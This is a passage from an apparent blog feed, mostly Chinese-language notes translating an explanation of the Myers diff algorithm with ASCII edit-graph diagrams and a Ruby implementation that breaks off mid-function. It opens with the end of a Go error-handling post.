 <div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> SyntaxError <span class="keyword">struct</span> &#123;</span><br><span class="line">    msg    <span class="type">string</span> <span class="comment">// description of error</span></span><br><span class="line">    Offset <span class="type">int64</span>  <span class="comment">// error occurred after reading Offset bytes</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *SyntaxError)</span></span> Error() <span class="type">string</span> &#123; <span class="keyword">return</span> e.msg &#125;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> err := dec.Decode(&amp;val); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> serr, ok := err.(*json.SyntaxError); ok &#123;</span><br><span class="line">        line, col := findLine(f, serr.Offset)</span><br><span class="line">        <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s:%d:%d: %v&quot;</span>, f.Name(), line, col, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
</li>
<li><p>把 error handle 包裹为函数扔出去，使之成为其他函数的入参</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>Go</tag>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title>（译） Git Myers diff 笔记</title>
    <url>/2020/06/14/git-myers-diff/</url>
    <content><![CDATA[<h1 id="Git-Myers-diff-笔记"><a href="#Git-Myers-diff-笔记" class="headerlink" title="Git Myers diff 笔记"></a>Git Myers diff 笔记</h1><p>参考文章链接：</p>
<p><a class="link"   href="http://www.xmailserver.org/diff2.pdf" >Myers diff paper<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.jcoglan.com/2017/02/12/the-myers-diff-algorithm-part-1/" >Myers diff algorithm blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="Diff-Usage："><a href="#Diff-Usage：" class="headerlink" title="Diff Usage："></a>Diff Usage：</h2><ol>
<li>尚未提交时可以检查 单个commit 节点的变更</li>
<li>merge 前比较两个分支的不同</li>
<li>可选择性地打 patch： merge 时通常会使用两个及以上的变更历史（往往是针对同一文件）进行调和来生成新的 tree (git的Bolb 和 tree 对象)，这就意味着可以有选择地对change进行应用变更，而不是直接拷整个文件。并且因为这点，很多版本系统都采用了非快照而是存 变更 地方式。</li>
</ol>
<h2 id="GIst"><a href="#GIst" class="headerlink" title="GIst"></a>GIst</h2><p>阐述该算法使用的基本模型，并实现一个简单的版本转换样例</p>
<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>现假设存在两个串(git 以行为单位，这里串的每个字符代表一行)</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">a = ABCABBA</span><br><span class="line">b = CBABAC</span><br></pre></td></tr></table></figure></div>

<p>最蠢的全量插删法这里就不提了。</p>
<p>这里先罗列几种将 a 转换成 b 可选的方案：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.  - A       2.  - A       3.  + C</span><br><span class="line">    - B           + C           - A</span><br><span class="line">      C             B             B</span><br><span class="line">    - A           - C           - C</span><br><span class="line">      B             A             A</span><br><span class="line">    + A             B             B</span><br><span class="line">      B           - B           - B</span><br><span class="line">      A             A             A</span><br><span class="line">    + C           + C           + C</span><br></pre></td></tr></table></figure></div>

<p>blog 的作者这里没具体说三种方案是啥，但是看用例大致是以下三种：</p>
<ol>
<li><p>a 与 b 比较，遇到不同的先删除，遇到相同则开始同步，最后将剩余的补足。</p>
</li>
<li><p>a 与 b 比较，遇到不同的先删除，若删除后的前缀能满足匹配则过渡，否则插入目标字符。</p>
</li>
<li><p>与 2 相同，但是是先插后删。</p>
</li>
</ol>
<p>上面三种方案都是只活动了 5 个单位就将 a 转换成了 b，这三种方案里应该有一种是你的 diff preference 方案。</p>
<p>综上来看一个好的 diff 算法至少包含两个特性： a. 它仅仅需要活动最少的单元来完成变更 b. 它应该有 good taste</p>
<p>先来举两个例子表现下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Good:   class Foo                   Bad:    class Foo</span><br><span class="line">          def initialize(name)                def initialize(name)</span><br><span class="line">            @name = name                        @name = name</span><br><span class="line">          end                             +   end</span><br><span class="line">      +                                   +</span><br><span class="line">      +   def inspect                     +   def inspect</span><br><span class="line">      +     @name                         +     @name</span><br><span class="line">      +   end                                 end</span><br><span class="line">        end                                 end</span><br></pre></td></tr></table></figure></div>

<p>正常人一般喜欢第一种吧，因为这种合乎人类直觉，符合代码结构，比较清纯。 <del>[在下不喜欢第一种，在下就喜欢骚的]</del></p>
<p>如果喜欢第一种的话那么 <code>Myers diff</code> 就很适合你，因为它采用的是贪心的策略，也就是先吃掉尽可能多的行然后才会 make changes, 这样的话就不会出现第二种 <code>bad  end</code>.</p>
<h2 id="Build-Graph"><a href="#Build-Graph" class="headerlink" title="Build Graph"></a>Build Graph</h2><p>Myers paper 核心 idea 就是旨在找出 shortest edit script (SES)， 也就是最短活动单元，然后在此之上构建图搜。</p>
<p>现在来构建一种图来阐述这个变换关系：</p>
<p>存在一个这样的坐标系，它的 <code>x</code> 轴分布对应 a 串， <code>y</code> 轴分布对应 b 串， <code>x</code> 的 increase 代表对 a 的删除， <code>y</code> 的 increase 代表对 b 的插入。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">       A     B     C     A     B     B     A</span><br><span class="line"></span><br><span class="line">    o-----o-----o-----o-----o-----o-----o-----o   0</span><br><span class="line">    |     |     | \   |     |     |     |     |</span><br><span class="line">C   |     |     |  \  |     |     |     |     |</span><br><span class="line">    |     |     |   \ |     |     |     |     |</span><br><span class="line">    o-----o-----o-----o-----o-----o-----o-----o   1</span><br><span class="line">    |     | \   |     |     | \   | \   |     |</span><br><span class="line">B   |     |  \  |     |     |  \  |  \  |     |</span><br><span class="line">    |     |   \ |     |     |   \ |   \ |     |</span><br><span class="line">    o-----o-----o-----o-----o-----o-----o-----o   2</span><br><span class="line">    | \   |     |     | \   |     |     | \   |</span><br><span class="line">A   |  \  |     |     |  \  |     |     |  \  |</span><br><span class="line">    |   \ |     |     |   \ |     |     |   \ |</span><br><span class="line">    o-----o-----o-----o-----o-----o-----o-----o   3</span><br><span class="line">    |     | \   |     |     | \   | \   |     |</span><br><span class="line">B   |     |  \  |     |     |  \  |  \  |     |</span><br><span class="line">    |     |   \ |     |     |   \ |   \ |     |</span><br><span class="line">    o-----o-----o-----o-----o-----o-----o-----o   4</span><br><span class="line">    | \   |     |     | \   |     |     | \   |</span><br><span class="line">A   |  \  |     |     |  \  |     |     |  \  |</span><br><span class="line">    |   \ |     |     |   \ |     |     |   \ |</span><br><span class="line">    o-----o-----o-----o-----o-----o-----o-----o   5</span><br><span class="line">    |     |     | \   |     |     |     |     |</span><br><span class="line">C   |     |     |  \  |     |     |     |     |</span><br><span class="line">    |     |     |   \ |     |     |     |     |</span><br><span class="line">    o-----o-----o-----o-----o-----o-----o-----o   6</span><br><span class="line"></span><br><span class="line">    0     1     2     3     4     5     6     7</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>【方便观看再列一下】</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">a = ABCABBA</span><br><span class="line">b = CBABAC</span><br></pre></td></tr></table></figure></div>

<p><strong>注意这里的删除是指在A的位置上删除，而插入是指在B的位置上插入，理解这个位置很关键</strong></p>
<p>如上图所示，来举例说明下就是：开始时都是在(0, 0), 现在移动到(1, 0), 那么代表 a 删除了第一个字符，串就变成了 <code>BCABBA</code>, 然后 (1,0) 移动到 (1, 1)，串就变成了 <code>CBCABBA</code>, 就这样推进下去不断地使 a 的前缀逼近 b 的前缀，最终会在 (7, 6) 得到需要的串。</p>
<p>此外除了横向纵向的移动外还有图中的斜线移动，比如(2, 0) <code>CABBA</code> 【第一个 C 是 a串的】 到 (3, 1) <code>CABBA</code> 【第一个 C 是 b 串的】，这种情况下就可以走斜线，因为二者是等价的【即相当于从两个串中消耗等同的字符，既不插入也不删除】</p>
<p>Myers algorithm 的算法就是找到上述的这种路径中移动次数最少的那一条。【这里的移动指的是一次单独的删a或者一次单独的添加b】。最多的移动数是  7 + 6 &#x3D; 13, 也就是俩串的长度和，也就是最蠢的全量增删。</p>
<p>上述在找最小的移动数的过程中要注意的是 <strong>斜向的移动</strong> 是白嫖的，因为它不进行变动花费(即不增加也不删除),所以找的过程中就是这么个原则：在你最终地移动数中应该尽可能多地包含 斜线向 而尽可能少地包含 横纵 向。上面也提到过了，其实最小的移动数就是 5，Myers 的目的就是要找到这个最短路。</p>
<h2 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0,0 --- 1,0</span><br><span class="line"> |</span><br><span class="line"> |</span><br><span class="line">0,1</span><br></pre></td></tr></table></figure></div>

<p>如图，二选一。</p>
<ol>
<li><p>先假设选 (0, 1), 那么从 (0, 0) 到 (2, 4) 就相当于只移动了两次 <code>[(0, 1)-&gt; (0, 2) |-&gt; (1, 3) |-&gt; (2, 4)]</code> ，因为斜线没有消耗。同样的到 (2, 2) 也只要两步。记录下这些移动路径和花费。</p>
</li>
<li><p>然后开始考虑 (1, 0) 的方案，同上，同样记录下从该点出发一次移动最多能移动多远。</p>
</li>
</ol>
<hr>
<p>上面两种方案中 到 (2, 2) 点的经历花费是一样的，但是更倾向选择 (1, 0)而非 (0, 1), 因为我们采取的方案更倾向于 先删后插(即先增x后增y)【更符合直觉】 而非先插后删。</p>
<hr>
<ol start="3">
<li>上面的记录了出行两步能达到的节点，大致反馈图如下</li>
</ol>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0,0 --- 1,0 --- 3,1</span><br><span class="line"> |       |</span><br><span class="line"> |       |</span><br><span class="line">0,1     2,2</span><br><span class="line"> |</span><br><span class="line"> |</span><br><span class="line">2,4</span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li>对上述的(2, 4), (2, 2), (3, 1) 重复前面的步骤【即移动一步后最终可达多远】，得到反馈图如下</li>
</ol>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0,0 --- 1,0 --- 3,1</span><br><span class="line"> |       |</span><br><span class="line"> |       |</span><br><span class="line">0,1     2,2 --- 5,4</span><br><span class="line"> |        \</span><br><span class="line"> |         \</span><br><span class="line">2,4 -       2,3</span><br><span class="line"> |   \</span><br><span class="line"> |    4,5</span><br><span class="line">3,6</span><br></pre></td></tr></table></figure></div>

<ol start="5">
<li>如果是常见的图搜，那么上面的 (2, 4) 右移 和 (2, 2) 的下移都是要记录移动结果【也就是 (4, 5), (2, 3) 都要记录】，但 (2, 3) 实际上可以抛弃，因为这俩都是经历了一次对 a 删除 和 两次对 b 插入，但是明显 (4, 5) 的结果更优【in any order】，因而抛弃掉 (2, 3) 的路径。【因为这个图模型的结构代表着仅存储经过 <strong>一组特定编辑</strong> 即可 <strong>达到</strong> 的 <strong>最佳位置</strong> 就足够了】继续跟进反馈如下</li>
</ol>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0,0 --- 1,0 --- 3,1</span><br><span class="line"> |       |</span><br><span class="line"> |       |</span><br><span class="line">0,1     2,2 --- 5,4</span><br><span class="line"> |</span><br><span class="line"> |</span><br><span class="line">2,4 --- 4,5</span><br><span class="line"> |</span><br><span class="line"> |</span><br><span class="line">3,6</span><br></pre></td></tr></table></figure></div>

<ol start="6">
<li>同样的从 (3, 1) 出发可以过(3, 2) 到(5, 4)，因而舍弃 <code>[(2, 2) -&gt; (3,2) |-&gt; (5, 4)]</code>【因为倾向 先删后插】</li>
</ol>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0,0 --- 1,0 --- 3,1 --- 5,2</span><br><span class="line"> |       |       |</span><br><span class="line"> |       |       |</span><br><span class="line">0,1     2,2     5,4</span><br><span class="line"> |</span><br><span class="line"> |</span><br><span class="line">2,4 --- 4,5</span><br><span class="line"> |</span><br><span class="line"> |</span><br><span class="line">3,6</span><br></pre></td></tr></table></figure></div>

<ol start="7">
<li>从上图开始加速，经过前面的整理我们可以得到这样的路线：</li>
</ol>
<hr>
<p>(3, 6) -&gt; (4, 6) || (4, 5) -&gt; (4, 6) &#x3D;&gt; (4, 5) -&gt; (4, 6)<br>(4, 5) -&gt; (5, 5) || (5, 4) -&gt; (5, 5) &#x3D;&gt; (5, 4) -&gt; (5, 5)<br>(5, 4) -&gt; (6, 4) |-&gt; (7, 5) || (5, 2) -&gt; (7, 5) &#x3D;&gt; (5, 4) -&gt; (7, 5)<br>(5, 2) -&gt; (7, 3)</p>
<hr>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">0,0 --- 1,0 --- 3,1 --- 5,2   </span><br><span class="line"> |       |       |           </span><br><span class="line"> |       |       |            </span><br><span class="line">0,1     2,2     5,4         </span><br><span class="line"> |</span><br><span class="line"> |</span><br><span class="line">2,4 --- 4,5 --- 5,5</span><br><span class="line"> |       |</span><br><span class="line"> |       |</span><br><span class="line">3,6     4,6                    </span><br><span class="line"></span><br><span class="line">0,0 --- 1,0 --- 3,1 --- 5,2</span><br><span class="line"> |       |       |</span><br><span class="line"> |       |       |</span><br><span class="line">0,1     2,2     5,4 --- 7,5</span><br><span class="line"> |               |</span><br><span class="line"> |               |</span><br><span class="line">2,4 --- 4,5     5,5</span><br><span class="line"> |       |</span><br><span class="line"> |       |</span><br><span class="line">3,6     4,6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0,0 --- 1,0 --- 3,1 --- 5,2 --- 7,3</span><br><span class="line"> |       |       |</span><br><span class="line"> |       |       |</span><br><span class="line">0,1     2,2     5,4 --- 7,5</span><br><span class="line"> |               |</span><br><span class="line"> |               |</span><br><span class="line">2,4 --- 4,5     5,5</span><br><span class="line"> |       |</span><br><span class="line"> |       |</span><br><span class="line">3,6     4,6</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ol start="8">
<li>经过如上步骤来到了第 5 步，因为已经知道了最少就是 5 步，所以这一次步进目的就是要找到 (7， 6)</li>
</ol>
<p>(4, 6) -&gt; (5, 6) || (5, 5) -&gt; (5, 6) &#x3D;&gt; (5, 5) -&gt; (5, 6)</p>
<p><strong>(7, 5) -&gt; (7, 6)</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0,0 --- 1,0 --- 3,1 --- 5,2 --- 7,3</span><br><span class="line"> |       |       |</span><br><span class="line"> |       |       |</span><br><span class="line">0,1     2,2     5,4 --- 7,5</span><br><span class="line"> |               |       |</span><br><span class="line"> |               |       |</span><br><span class="line">2,4 --- 4,5     5,5     7,6</span><br><span class="line"> |       |       |</span><br><span class="line"> |       |       |</span><br><span class="line">3,6     4,6     5,6</span><br></pre></td></tr></table></figure></div>

<h2 id="Basic-Summary"><a href="#Basic-Summary" class="headerlink" title="Basic Summary"></a>Basic Summary</h2><p>由上可得算法的基本 idea：给定两个字符串，找到代表这两个之间的图模型的最短路径。【其实就是广度优先的图搜最短路】</p>
<h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><p>将上述得到的图旋转 45 degrees 得到如下图：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    |      0     1     2     3     4     5</span><br><span class="line">----+--------------------------------------</span><br><span class="line">    |</span><br><span class="line"> 4  |                             7,3</span><br><span class="line">    |                           /</span><br><span class="line"> 3  |                       5,2</span><br><span class="line">    |                     /</span><br><span class="line"> 2  |                 3,1         7,5</span><br><span class="line">    |               /     \     /     \</span><br><span class="line"> 1  |           1,0         5,4         7,6</span><br><span class="line">    |         /     \           \</span><br><span class="line"> 0  |     0,0         2,2         5,5</span><br><span class="line">    |         \                       \</span><br><span class="line">-1  |           0,1         4,5         5,6</span><br><span class="line">    |               \     /     \</span><br><span class="line">-2  |                 2,4         4,6</span><br><span class="line">    |                     \</span><br><span class="line">-3  |                       3,6</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>水平轴就不用说了，就是树的深度，而纵轴其实就是 (x - y) 的值，这里方便后面说明取横轴为 <code>d</code> 轴，纵轴为 <code>k</code> 轴，注意的是 k 的取值范围取决于d，为 (-d, d), 且每次 k 的移动都是 2 步, 比如 (d, k) &#x3D; (2, 0) -&gt; (2, 2), k 的取值范围为 -2 … 2。</p>
<p>可见当 <code>x</code> 增长时， <code>k</code> + 1, <code>y</code> 轴增长 <code>k</code> - 1, 而斜轴使得 <code>x</code> , <code>y</code> 各增一步，所以 <code>k</code> 不变，换句话说 <code>k</code> 的增减 1 其实就是一次横纵移动。对这个图来说，需要 recording 的是记录不同的 <code>k</code> 值对应单次步进的最远距离。</p>
<blockquote>
<p>d 代表步数，可以到达点 (i，j), 如果期间经过了对角线， i, j 必定同时加 1<br>由上可得 d 可到达的步数为 (i + diagonal, j + diagonal), 其中diagonal 为经过对角线的次数<br>那么k &#x3D; x - y &#x3D; i - j  的奇偶性就依赖于 d<br>当 d 为奇数， i + j 就是奇数，自然 i-j 就是奇数 &#x3D;&gt; d 奇 k 奇, d 偶 k 偶</p>
</blockquote>
<blockquote>
<p>k 这里有个重点意识：任何抵达 k 线的点 必经过了至少 |k| 个 增或者删操作</p>
</blockquote>
<h2 id="Algorithm-proceeds"><a href="#Algorithm-proceeds" class="headerlink" title="Algorithm proceeds"></a>Algorithm proceeds</h2><p>目标是为了通过前一个节点的最佳移动来确认下一个 (d, k) 的最佳位置。最佳移动的特性很简单，就是有 highest x 的步进（而不是 y， 因为前面提过想先删后增）。</p>
<p>换句话说就是决策 从(d - 1, k - 1) 进行y++【会使 k - 1 + 1】, 或者从(d - 1, k + 1) x++【会使 k + 1 - 1】。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    |      0     1     2 </span><br><span class="line">----+----------------------</span><br><span class="line">    |</span><br><span class="line"> 1  |           1,0</span><br><span class="line">    |         /     \</span><br><span class="line"> 0  |     0,0       ( 2,2 )</span><br><span class="line">    |         \</span><br><span class="line">-1  |           0,1</span><br></pre></td></tr></table></figure></div>

<p>以上述为例，(d, k) &#x3D; (1, 0) or (0, 1) &#x3D;&gt; (2, 2) ，但是选 (1, 0) 【因为 highest x】, 所以我们采用了上图的路径。</p>
<p>也有时候两个 previous position 有着相同的 x， 这个时候就采用下一步移动【highest x】 的。比如 <code>(x, y) = [(2, 2) -&gt; (2, 3) || (2, 4) -&gt; (2, 3) ] =|&gt; (4， 5)</code></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    |      0     1     2     3</span><br><span class="line">----+----------------------------</span><br><span class="line">    |</span><br><span class="line"> 2  |                 3,1</span><br><span class="line">    |               /</span><br><span class="line"> 1  |           1,0</span><br><span class="line">    |         /     \</span><br><span class="line"> 0  |     0,0         2,2</span><br><span class="line">    |         \</span><br><span class="line">-1  |           0,1       ( 4,5 )</span><br><span class="line">    |               \     /</span><br><span class="line">-2  |                 2,4</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>tips: 这里说几个算法中用到的简化手段：1是存储 <code>k</code> 索引对应的 (x, y) 时可以不保存 <code>y</code>，因为y 可以用 <code>x-k</code> 算出. 2是不需要存储每次移动的方向，只需要存 best x 的值即可。 此过程结束后可找到最小的通往 (7,6) 的 depth, 并且通过回溯说明这条路径。</p>
</blockquote>
<p>经过上述的信息简化如下【移除了 y 和 路径方向】</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    |      0     1     2     3     4     5</span><br><span class="line">----+--------------------------------------</span><br><span class="line">    |</span><br><span class="line"> 4  |                              7</span><br><span class="line">    |</span><br><span class="line"> 3  |                        5</span><br><span class="line">    |</span><br><span class="line"> 2  |                  3           7</span><br><span class="line">    |</span><br><span class="line"> 1  |            1           5           7</span><br><span class="line">    |</span><br><span class="line"> 0  |      0           2           5</span><br><span class="line">    |</span><br><span class="line">-1  |            0           4           5</span><br><span class="line">    |</span><br><span class="line">-2  |                  2           4</span><br><span class="line">    |</span><br><span class="line">-3  |                        3</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>最后一个简化手段就是 dth 的 x 值只依赖于第 (d-1)th 的取值。 and because each round alternately modifies either the odd or the even k positions, each round does not modify the values it depends on from the previous round. 因为 x 可以存在以 k 为下标的一个扁平数组中. 在这个例子中，x 将随着 d 做出以下的演变：</p>
</blockquote>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">      k |   -3    -2    -1     0     1     2     3     4</span><br><span class="line">--------+-----------------------------------------------</span><br><span class="line">        |</span><br><span class="line">  d = 0 |                      0</span><br><span class="line">        |</span><br><span class="line">  d = 1 |                0     0     1</span><br><span class="line">        |</span><br><span class="line">  d = 2 |          2     0     2     1     3</span><br><span class="line">        |</span><br><span class="line">  d = 3 |    3     2     4     2     5     3     5</span><br><span class="line">        |</span><br><span class="line">  d = 4 |    3     4     4     5     5     7     5     7</span><br><span class="line">        |</span><br><span class="line">  d = 5 |    3     4     5     5     7     7     5     7</span><br></pre></td></tr></table></figure></div>

<p>  当发现在 (d, k) &#x3D; (5, 1) 处时可以到达 (x, y) &#x3D; (7, 6), 迭代结束。</p>
<h2 id="Show-me-code"><a href="#Show-me-code" class="headerlink" title="Show me code"></a>Show me code</h2><p>现在开始进行代码实现：首先创建一个方法，方法包含了两个list，也就是前面说的 a 和 b， 他们都各自包含了Diff::Line 对象集。</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> <span class="title class_">Diff</span></span><br><span class="line">  <span class="title class_">Line</span> = <span class="title class_">Struct</span>.new(<span class="symbol">:number</span>, <span class="symbol">:text</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">self</span>.lines(document)</span><br><span class="line">    document = document.lines <span class="keyword">if</span> document.is_a?(<span class="title class_">String</span>)</span><br><span class="line">    document.map.with_index &#123; |<span class="params">text, i</span>| <span class="title class_">Line</span>.new(i + <span class="number">1</span>, text) &#125;</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>

<p>然后写个工具方法，用来对 串的每个字符转换成行后的对象 进行diff</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> <span class="title class_">Diff</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">self</span>.diff(a, b, <span class="symbol">differ:</span> <span class="title class_">Myers</span>)</span><br><span class="line">    differ.diff(lines(a), lines(b))</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>
<p>上述的准备工作中保存了看似无用的行号，其实是为了方便打印之类的后续操作。</p>
<p>现在开始实现 Myers Class, 首先给a b 打个样，把他们绑在 myers instance 上进行初始化，然后实现 diff</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Myers</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">self</span>.diff(a, b)</span><br><span class="line">    new(a, b).diff</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">a, b</span>)</span><br><span class="line">    <span class="variable">@a</span>, <span class="variable">@b</span> = a, b</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">diff</span></span><br><span class="line">    <span class="comment"># TODO</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>

<p>标注下 a，b 串的长度和最长移动步数【ab的长度和】</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shortest_edit</span></span><br><span class="line">  n, m = <span class="variable">@a</span>.size, <span class="variable">@b</span>.size</span><br><span class="line">  max  = n + m</span><br></pre></td></tr></table></figure></div>

<p>然后安排一个这样的数组用来存对应不同 k 的最新 x 值，其中 k可以取值 (-max, max), 按理说用双向链表好一点，这里为了方便，把数组开大点就行。</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line">v = <span class="title class_">Array</span>.new(<span class="number">2</span> * max + <span class="number">1</span>)</span><br><span class="line">v[<span class="number">1</span>] = <span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<p>然后创建一个双重循环，外循环用来遍历 <code>d 0...max 1step</code>, 内循环用来遍历 <code>k -d...d 2step</code>，然后根据 k 决定是 x 的值。如果 <code>k == -d || (k != d &amp;&amp; v(k -1) &lt; v(k-1))</code>，那么我们向下移动，即 y++ ，将x不变视为等于上一轮的k + 1的值。否则，我们将向右移动，并将x 在 last &#96;k 的基础上加 1。</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line">(<span class="number">0</span> .. max).step <span class="keyword">do</span> |<span class="params">d</span>|</span><br><span class="line">  (-d .. d).step(<span class="number">2</span>) <span class="keyword">do</span> |<span class="params">k</span>|</span><br><span class="line">    <span class="keyword">if</span> k == -d <span class="keyword">or</span> (k != d <span class="keyword">and</span> v[k - <span class="number">1</span>] &lt; v[k + <span class="number">1</span>])</span><br><span class="line">        x = v[k + <span class="number">1</span>]</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        x = v[k - <span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      y = x - k</span><br></pre></td></tr></table></figure></div>

<p>然后是斜线移动，只要 a b 的x y位置对应字母相同，那么就可以同时增长 x y持续到发生变更为止，并将停留点作为新的x。</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> x &lt; n <span class="keyword">and</span> y &lt; m <span class="keyword">and</span> <span class="variable">@a</span>[x].text == <span class="variable">@b</span>[y].text</span><br><span class="line">          x, y = x + <span class="number">1</span>, y + <span class="number">1</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        v[k] = x</span><br></pre></td></tr></table></figure></div>

<p>在上面的基础上，如果最终到达 (7. 6) 则停止 </p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">return</span> d <span class="keyword">if</span> x &gt;= n <span class="keyword">and</span> y &gt;= m</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>

<p>上面算出来了最小的移动数但是没有记录移动路径也就是实际的变更记录。</p>
<h2 id="Record-Path"><a href="#Record-Path" class="headerlink" title="Record Path"></a>Record Path</h2><div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shortest_edit</span></span><br><span class="line">  n, m = <span class="variable">@a</span>.size, <span class="variable">@b</span>.size</span><br><span class="line">  max  = n + m</span><br><span class="line"></span><br><span class="line">  v    = <span class="title class_">Array</span>.new(<span class="number">2</span> * max + <span class="number">1</span>)</span><br><span class="line">  v[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  (<span class="number">0</span> .. max).step <span class="keyword">do</span> |<span class="params">d</span>|</span><br><span class="line">    (-d .. d).step(<span class="number">2</span>) <span class="keyword">do</span> |<span class="params">k</span>|</span><br><span class="line">      <span class="keyword">if</span> k == -d <span class="keyword">or</span> (k != d <span class="keyword">and</span> v[k - <span class="number">1</span>] &lt; v[k + <span class="number">1</span>])</span><br><span class="line">        x = v[k + <span class="number">1</span>]</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        x = v[k - <span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      y = x - k</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> x &lt; n <span class="keyword">and</span> y &lt; m <span class="keyword">and</span> <span class="variable">@a</span>[x].text == <span class="variable">@b</span>[y].text</span><br><span class="line">        x, y = x + <span class="number">1</span>, y + <span class="number">1</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      v[k] = x</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> d <span class="keyword">if</span> x &gt;= n <span class="keyword">and</span> y &gt;= m</span><br><span class="line">    <span 